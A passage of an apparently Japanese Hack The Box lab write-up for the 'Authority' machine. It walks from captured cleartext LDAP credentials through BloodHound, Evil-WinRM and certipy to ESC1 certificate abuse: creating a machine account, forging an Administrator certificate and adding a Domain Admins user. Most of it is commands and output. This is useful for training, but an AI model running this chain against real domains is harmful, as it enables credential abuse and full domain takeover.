[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.129.59.172
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.129.59.172
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.129.59.172
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.129.59.172
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.129.59.172
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

LDAPで本当に使えるのか試す
- 使えそう
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://authority.htb.corp \
  -D "CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb" \
  -w 'lDaP_1n_th3_cle4r!' \
  -b "DC=authority,DC=htb" \
  "(objectClass=*)"
# extended LDIF
#
# LDAPv3
# base <DC=authority,DC=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# authority.htb
dn: DC=authority,DC=htb
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=authority,DC=htb
instanceType: 5
<SNIP>

```



# Lateral Movement
## BloodHound
BloodHoundを使って、横展開する
bloodHoundのために情報集める
```bash
└─$ sudo bloodhound-python \
  -u 'svc_ldap' \
  -p 'lDaP_1n_th3_cle4r!' \
  -ns 10.129.59.172 \
  -d authority.htb \
  -c all
[sudo] password for kali: 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: authority.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (authority.authority.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: authority.authority.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: authority.authority.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 5 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: authority.authority.htb
INFO: Done in 00M 18S

```

少々見にくいが、BloodHoubnd内で、SVC_LDAPのReachable High Value Targetsを見てみると、
SVC_LDAPが、AUTHORITY.AUTHORITY.HTBにPSRemoteでき、AUTHORITY.HTBの管理者権限が取得できたら、AUTHORITY.HTBに対して、DCSyncできる
このようにして、ドメイン権限を取得できそう
![](https://i.imgur.com/h92x0fm.png)

まず、AUTHORITY.AUTHORITY.HTBにPSRemoteする
winrmで接続できるので、Evil-WinRMで接続する
```bash
└─$ evil-winrm -i authority.htb -u 'authority.htb\svc_ldap' -p 'lDaP_1n_th3_cle4r!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> ls

```

権限確認
```bash
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```
# Privilege Escalation

## 証明書の脆弱性
- certipy-ad find の結果、CA「AUTHORITY-CA」に属するテンプレート「CorpVPN」がESC1に脆弱であり、Domain Computers に Enrollment 権限があるため、svc_ldap でも証明書リクエストができることがわかった
```bash
└─$ certipy-ad find -u 'svc_ldap@authority.htb.corp' -p 'lDaP_1n_th3_cle4r!' -target authority.htb.corp -stdout -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: authority.htb.corp.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: authority.authority.htb.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: authority.authority.htb
[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP
[-] Failed to connect to remote registry: [Errno Connection error (authority.authority.htb:445)] [Errno -2] Name or service not known
[-] Use -debug to print a stacktrace
[!] Failed to get CA configuration for 'AUTHORITY-CA' via RRP: 'NoneType' object has no attribute 'request'
[!] Use -debug to print a stacktrace
[!] Could not retrieve configuration for 'AUTHORITY-CA'
[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'
[!] DNS resolution failed: The DNS query name does not exist: authority.authority.htb.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: authority.authority.htb
[!] Error checking web enrollment: [Errno -2] Name or service not known
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: authority.authority.htb.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: authority.authority.htb
[!] Error checking web enrollment: [Errno -2] Name or service not known
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Unknown
    Request Disposition                 : Unknown
    Enforce Encryption for Requests     : Unknown
    Active Policy                       : Unknown
    Disabled Extensions                 : Unknown
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

ドメインコンピュータアカウントを作成
- マシンアカウントのみが証明書発行することができるので、マシンアカウントを作成する
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ certipy-ad account create \
  -u svc_ldap@authority.htb.corp \
  -p 'lDaP_1n_th3_cle4r!' \
  -target 10.129.35.185 \
  -user WIN-HACK3$
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Creating new account:
    sAMAccountName                      : WIN-HACK3$
    unicodePwd                          : T5AePoKlec2isM6l
    userAccountControl                  : 4096
    servicePrincipalName                : HOST/WIN-HACK3
                                          RestrictedKrbHost/WIN-HACK3
    dnsHostName                         : win-hack3.authority.htb
[*] Successfully created account 'WIN-HACK3$' with password 'T5AePoKlec2isM6l'


```

 管理者になりすます証明書をリクエスト
- 作成したマシンアカウントで、脆弱な証明書を取得する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ certipy-ad req \
  -username 'WIN-HACK3$@authority.htb.corp' \
  -password 'T5AePoKlec2isM6l' \            
  -ca 'AUTHORITY-CA' \
  -dc-ip 10.129.35.185 \
  -template 'CorpVPN' \
  -upn 'Administrator@authority.htb' \
  -dns authority.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with multiple identities
    UPN: 'Administrator@authority.htb'
    DNS Host Name: 'authority.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator_authority.pfx'
[*] Wrote certificate and private key to 'administrator_authority.pfx'




```


証明書を使って LDAP シェルに接続
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ certipy-ad auth \
  -pfx administrator_authority.pfx \
  -dc-ip 10.129.35.185 \
  -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@authority.htb'
[*]     SAN DNS Host Name: 'authority.htb'
[*] Connecting to 'ldaps://10.129.35.185:636'
add_user haxor
[*] Authenticated to '10.129.35.185' as: 'u:HTB\\Administrator'
Type help for list of commands

# add_user haxor
Attempting to create user in: %s CN=Users,DC=authority,DC=htb
Adding new user with username: haxor and password: \Mk:d83O?Y.[@~m result: OK

# add_user_to_group haxor "Domain Admins"
Adding user: haxor to group Domain Admins result: OK

```

WinRMシェルで管理者アクセスを取得
- 管理者権限が取得できた
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ evil-winrm -i 10.129.35.185 -u haxor -p '\Mk:d83O?Y.[@~m'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\haxor\Documents> whoami
htb\haxor
*Evil-WinRM* PS C:\Users\haxor\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

```
